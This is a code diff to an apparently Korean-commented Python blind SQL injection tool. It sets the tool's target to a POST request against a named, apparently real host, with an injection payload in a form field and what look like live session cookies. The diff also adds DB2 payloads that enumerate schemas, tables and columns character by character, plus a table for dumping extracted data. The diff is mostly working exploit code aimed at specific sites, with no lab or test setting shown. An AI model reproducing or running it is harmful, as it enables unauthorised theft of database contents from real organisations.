@@ -10,23 +10,23 @@ from time import sleep
 
 warnings.filterwarnings('ignore')
 
-length = 200
+length = 1000
 
 
 ########################################################################################################
 ############################################### JSON 타입 ###############################################
 
-REQUEST_STRING = """
-GET /e_library/lg_brands?ca=1234)+or+1=2+--+&search= HTTP/1.1
-host: dev.luxeduglobal.com
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://dev.luxeduglobal.com/e_library/lg_brands?ca=&search=belif
-Cookie: _fwb=43KIdndcVp5BklwmUAoBg1.1747704066584; _ga=GA1.1.1678676152.1747704067; _fwb=43KIdndcVp5BklwmUAoBg1.1747704066584; remem_id=Y; id=scorp001; session_member=gn7bt7rpdlj0me85mgsnbpc2rfvpd7uu; _mi=fb01f4ff2d3e4381c35a7997760a54d16584a6b1989e9a7e22f949c1a876c553184dba1b7a9f3b2c7b82ef5a32e3996c5aff7bcdf392e8b0fc15a041b356b1ebnnsxsG8Vd03e6A9MM%2BGQ01k%2BeH3iOVpnCZAEjK8uBlQ%3D; wcs_bt=11fd4821c799ac0:1747892437; _ga_SPQL5PKLB6=GS2.1.s1747878881$o12$g1$t1747892437$j0$l0$h0
-Connection: keep-alive
+# REQUEST_STRING = """
+# GET /e_library/lg_brands?ca=1234)+or+1=2+--+&search= HTTP/1.1
+# host: dev.luxeduglobal.com
+# Upgrade-Insecure-Requests: 1
+# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
+# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+# Referer: http://dev.luxeduglobal.com/e_library/lg_brands?ca=&search=belif
+# Cookie: _fwb=43KIdndcVp5BklwmUAoBg1.1747704066584; _ga=GA1.1.1678676152.1747704067; _fwb=43KIdndcVp5BklwmUAoBg1.1747704066584; remem_id=Y; id=scorp001; session_member=gn7bt7rpdlj0me85mgsnbpc2rfvpd7uu; _mi=fb01f4ff2d3e4381c35a7997760a54d16584a6b1989e9a7e22f949c1a876c553184dba1b7a9f3b2c7b82ef5a32e3996c5aff7bcdf392e8b0fc15a041b356b1ebnnsxsG8Vd03e6A9MM%2BGQ01k%2BeH3iOVpnCZAEjK8uBlQ%3D; wcs_bt=11fd4821c799ac0:1747892437; _ga_SPQL5PKLB6=GS2.1.s1747878881$o12$g1$t1747892437$j0$l0$h0
+# Connection: keep-alive
 
-"""
+# """
 
 # ############################################### GET 방식 ###############################################
 
@@ -44,21 +44,24 @@ Connection: keep-alive
 
 ############################################### POST 방식 ###############################################
 
-# REQUEST_STRING = """
-# POST / HTTP/1.1
-# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
-# Accept-Encoding: gzip, deflate, br
-# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-# Connection: keep-alive
-# host: 192.168.219.100:5001
-# Accept-Language: ko-KR,ko;q=0.9
-# Upgrade-Insecure-Requests: 1
-# Cookie: security_level=0; PHPSESSID=117eca5e7194d9415b200e7a15200933
-# Content-Type: application/x-www-form-urlencoded
-# Content-Length: 83
+REQUEST_STRING = """
+POST /CCB/activity/dkreport_list.jsp?npage=1 HTTP/1.1
+Content-Length: 115
+Host: amtsdev.ccbk.co.kr
+Cache-Control: max-age=0
+Origin: http://amtsdev.ccbk.co.kr
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://amtsdev.ccbk.co.kr/CCB/activity/dkreport_list.jsp?npage=1
+Accept-Encoding: gzip, deflate, br
+Accept-Language: ko,zh-TW;q=0.9,zh;q=0.8
+Cookie: JSESSIONID=0000E3fBunv9OPZd16WYRNWSAmn:-1
+Connection: keep-alive
 
-# username='%7C%7C(case+when+1=2+then+'kazal92'+else+'test'+end)%7C%7C'&password=1234
-# """
+npage=1&account_name=&startDt=&endDt=&dk_depart=&team_code=&site_code='+AND+1=2+--+&account_code=&item=&COND_WHERE=
+"""
 
 ########################################################################################################
 ########################################################################################################
@@ -171,6 +174,17 @@ class SQLiteProcessor:
                 column_name VARCHAR(255), 
                 UNIQUE(db_name, table_name, column_name)
             )''')
+
+        self.cursor.execute('''
+            CREATE TABLE IF NOT EXISTS data_dump (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                db_name TEXT,
+                table_name TEXT,
+                column_name TEXT,
+                row_index INTEGER,
+                data TEXT
+            )
+        ''')
         
     def store_result(self, data_type, insert_data, select_db=None, select_table=None, field=None):
         """적절한 데이터베이스 테이블을 저장"""
@@ -185,13 +199,12 @@ class SQLiteProcessor:
             self.cursor.execute("INSERT OR IGNORE INTO dbs_info (db_name) VALUES (?)", (insert_data,))
             
         elif data_type == "tables":
-            self.cursor.execute("INSERT OR IGNORE INTO table_info (db_name, table_name) VALUES (?, ?)", 
-                              (select_db, insert_data))
+            self.cursor.execute("INSERT OR IGNORE INTO table_info (db_name, table_name) VALUES (?, ?)", (select_db, insert_data))
             
         elif data_type == "columns":
-            self.cursor.execute("INSERT OR IGNORE INTO column_info (db_name, table_name, column_name) VALUES (?, ?, ?)", 
-                              (select_db, select_table, insert_data))
-            
+            self.cursor.execute("INSERT OR IGNORE INTO column_info (db_name, table_name, column_name) VALUES (?, ?, ?)", (select_db, select_table, insert_data))
+        # elif data_type == "data":
+        #     self.cursor.execute("INSERT INTO data_dump (db_name, table_name, column_name, row_index, data) VALUES (?, ?, ?, ?, ?)", (db, table, column, row_idx, value))
         self.conn.commit()
         
     def close(self):
@@ -330,6 +343,45 @@ class BlindSQLInjector:
                         'columns': "ASCII((SUBSTR((SELECT column_name FROM (SELECT rownum r, column_name FROM all_tab_columns WHERE owner='{select_db}' AND table_name='{select_table}')tb WHERE tb.r={rows}),{substr_index},1)))>{mid_val}"
                     }
                 }
+
+        if dbms == 'db2':
+            if self.args.basic:
+                print(f"{Colors.LIGHT_BLUE}{Colors.UNDERLINE} DB2 Basic Information Extraction {Colors.END}\n")
+                payloads = {
+                    'Current-DB': {
+                        'count': "",
+                        'len': "(SELECT LENGTH(CURRENT SERVER) FROM SYSIBM.SYSDUMMY1)>{mid_val}",
+                        'Current-DB': "ASCII(SUBSTR((SELECT current server FROM sysibm.sysdummy1),{substr_index},1))>{mid_val}"
+                    }
+                }
+            elif self.args.dbs:
+                print(f"{Colors.LIGHT_BLUE}{Colors.UNDERLINE} DB2 Database Enumeration {Colors.END}\n")
+                payloads = {
+                    'Dbs': {
+                        'count': "(SELECT COUNT(*) FROM syscat.schemata)>{mid_val}",
+                        'len': "(SELECT LENGTH(schemaname) FROM (SELECT ROW_NUMBER() OVER(ORDER BY schemaname) r, schemaname FROM syscat.schemata)tb WHERE tb.r={rows})>{mid_val}",
+                        'dbs': "ASCII(SUBSTR((SELECT schemaname FROM (SELECT ROW_NUMBER() OVER(ORDER BY schemaname) r, schemaname FROM syscat.schemata)tb WHERE tb.r={rows}),{substr_index},1))>{mid_val}"
+                    }
+                }
+            elif self.args.tables:
+                print(f"{Colors.LIGHT_BLUE}{Colors.UNDERLINE} DB2 Table Enumeration {Colors.END}\n")
+                payloads = {
+                    'Tables': {
+                        'count': "(SELECT COUNT(*) FROM sysibm.systables WHERE creator='{select_db}')>{mid_val}",
+                        'len': "(SELECT LENGTH(name) FROM (SELECT ROW_NUMBER() OVER(ORDER BY name) r, name FROM sysibm.systables WHERE creator='{select_db}')tb WHERE tb.r={rows})>{mid_val}",
+                        'tables': "ASCII(SUBSTR((SELECT name FROM (SELECT ROW_NUMBER() OVER(ORDER BY name) r, name FROM sysibm.systables WHERE creator='{select_db}')tb WHERE tb.r={rows}),{substr_index},1))>{mid_val}"
+                    }
+                }
+            elif self.args.columns:
+                print(f"{Colors.LIGHT_BLUE}{Colors.UNDERLINE} DB2 Column Enumeration {Colors.END}\n")
+                payloads = {
+                    'Columns': {
+                        'count': "(SELECT COUNT(*) FROM sysibm.syscolumns WHERE tbcreator='{select_db}' AND tbname='{select_table}')>{mid_val}",
+                        'len': "(SELECT LENGTH(name) FROM (SELECT ROW_NUMBER() OVER(ORDER BY colno) r, name FROM sysibm.syscolumns WHERE tbcreator='{select_db}' AND tbname='{select_table}')tb WHERE tb.r={rows})>{mid_val}",
+                        'columns': "ASCII(SUBSTR((SELECT name FROM (SELECT ROW_NUMBER() OVER(ORDER BY colno) r, name FROM sysibm.syscolumns WHERE tbcreator='{select_db}' AND tbname='{select_table}')tb WHERE tb.r={rows}),{substr_index},1))>{mid_val}"
+                    }
+                }
+
                 
         elif dbms == 'mysql':
             if self.args.basic:
@@ -453,7 +505,8 @@ class BlindSQLInjector:
                     
                 check_message_size = len(response.content)
             #응답 크기가 기준선과 다른 경우 true
-            # print("기준 : " + str(self.false_message_size) + " 응답 : " + str(check_message_size))
+            test_check = (check_message_size - self.false_message_size)
+            print("응답 : " + str(check_message_size) + " 기준 : " + str(self.false_message_size) +  " 차이 : " + str(test_check))
             return (check_message_size - self.false_message_size) > length # 응답길이 - 기준길이 > 200 = True
             
         except requests.exceptions.RequestException as e:
@@ -521,8 +574,7 @@ class BlindSQLInjector:
             # 행 카운트 결정 (기본 정보 제외)
             if not self.args.basic:
                 for key, value in result_payload.items():
-                    row_count = self.binary_search(0, 127, data, result_payload[key]['count'], None, None, 
-                                                 self.args.select_db, select_table_one, None)
+                    row_count = self.binary_search(0, 10, data, result_payload[key]['count'], None, None, self.args.select_db, select_table_one, None) # 행 카운트 
             else:
                 row_count = 1
                 
@@ -536,16 +588,14 @@ class BlindSQLInjector:
                     for key2, value2 in list(value.items())[1:]:  #딕셔너리를 리스트로 변환 후 첫번째 값(count)는 제외하고 실행 
                         if key2 == 'len':
                             # Oracle Rownum은 1에서 시작
-                            if self.args.dbms.lower() == 'oracle': # 오라클일 경우 rownum은 1부터 시작하기에 + 1 해야됨
+                            if self.args.dbms.lower() in ('oracle', 'db2'): # 오라클일 경우 rownum은 1부터 시작하기에 + 1 해야됨
                                 rows += 1 # 길이를 구하고 이름을 뽑고하는 방식이기 때문에 길이를 구할때만 +1하면됨
-                            data_len = self.binary_search(0, 127, data, value2, None, rows, 
-                                                        self.args.select_db, select_table_one, None)
-                            print(f"[*] Length: {str(data_len)}")
+                            data_len = self.binary_search(0, 127, data, value2, None, rows, self.args.select_db, select_table_one, None) # 데이터 길이 결정
+                            print(f"[*] Length [{rows}]: {str(data_len)}")
                         else:
                             name_str = ""
                             for substr_index in range(0, data_len): # 데이터 글자 수 만큼 반복
-                                char_code = self.binary_search(0, 127, data, value2, substr_index + 1, rows, 
-                                                             self.args.select_db, select_table_one, None)
+                                char_code = self.binary_search(0, 127, data, value2, substr_index + 1, rows, self.args.select_db, select_table_one, None)
                                 name_str += chr(char_code)
                                 
                             # SQLITE의 저장 결과
